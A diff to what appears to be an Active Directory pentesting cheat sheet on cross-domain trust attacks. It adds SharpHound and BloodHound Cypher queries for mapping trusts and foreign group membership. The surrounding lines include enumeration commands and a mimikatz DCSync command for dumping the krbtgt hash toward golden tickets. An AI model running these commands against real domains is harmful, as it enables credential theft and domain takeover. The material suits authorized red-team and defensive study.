@@ -6,6 +6,8 @@
 - `Get-DomainTrust -Domain <domain>`
 - `Get-DomainTrustMapping`
 - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts`
+- `sharphound.exe -c trusts -d <domain>`
+  - `MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p`
 - Get Domains SID
   - `Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>` 
   - `lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0`
@@ -35,9 +37,9 @@
     - password reuse >>> lat move (creds/pth/...)
     - Foreign group and users >>> ACL
       - Users with foreign Domain Group Membership
-        - `MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="<domain>" AND m.domain<>n.domain RETURN p`
+        - `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
       - Group with foreign Domain Group Membership
-        - `MATCH p=(n:Group {domain:"<domain>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain AND n.name<>m.name RETURN p`
+        - `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
     - SID History on B >>> PassTheTicket
       - Golden ticket
         - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
